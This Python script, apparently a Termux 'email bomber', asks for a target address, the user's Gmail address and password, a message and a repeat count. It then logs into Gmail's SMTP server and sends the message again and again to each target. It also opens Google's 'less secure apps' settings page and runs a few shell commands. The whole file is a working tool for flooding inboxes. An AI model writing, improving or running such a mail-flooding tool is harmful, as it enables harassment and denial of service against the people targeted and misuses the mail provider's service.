import smtplib
import time
import os
R="\033[1;34m"
G="033[1;m"
os.system('clear')
os.system('rm email.txt')
os.system('bash .banner.sh')
#print (#).banner
#print ('#print ('''μ  | | \
#print ('''  | |  __/ |  | | | | | |#print ('  |_|\___|_|  |_| |_| |_|\__,_/_/\_\'')
#droid=str(input("\033[1;34m              ●~"+ G +"Are You? "+ R +"~》 ")
print ("\033[4;35mPleace Allow less secure apps: disabled\033[0m")
os.system('termux-open https://myaccount.google.com/u/1/lesssecureapps?pli=1&rapt=AEjHL4NneZaP3YkUtLBfIcEgpOuj5N7j8sD6v1KVNIEKwPtm9Y23nSdMALpcqdFgr03YbFj_FfN3ahy-ZiOvZqLjTo21tlMQvw')
os.system('start https://myaccount.google.com/u/1/lesssecureapps?pli=1&rapt=AEjHL4NneZaP3YkUtLBfIcEgpOuj5N7j8sD6v1KVNIEKwPtm9Y23nSdMALpcqdFgr03YbFj_FfN3ahy-ZiOvZqLjTo21tlMQvw')
os.system('touch email.txt')
print ("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|                             \033[1;m")
print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|                         \033[1;m")
print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")
print (" \n")

sentence = input("Email Trage: ")
word = input("Please enter to save {email.txt}")
with open('email.txt', 'w') as f:
    f.write('{} {}'.format(sentence, word))
files = open('email.txt', 'r')
bomb_emails = files.readlines()


email = input("Enter your gmail_address:")
password = input("Enter your gmail_password:")
message = input("Enter Message:")
message_relode = int(input("How many message you want to send?:"))


for bomb_email in bomb_emails:
    for x in range(0, message_relode):
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        print("message sent to {}".format(bomb_email))
    time.sleep(1)

mail.close()
files.close()

print("Done")
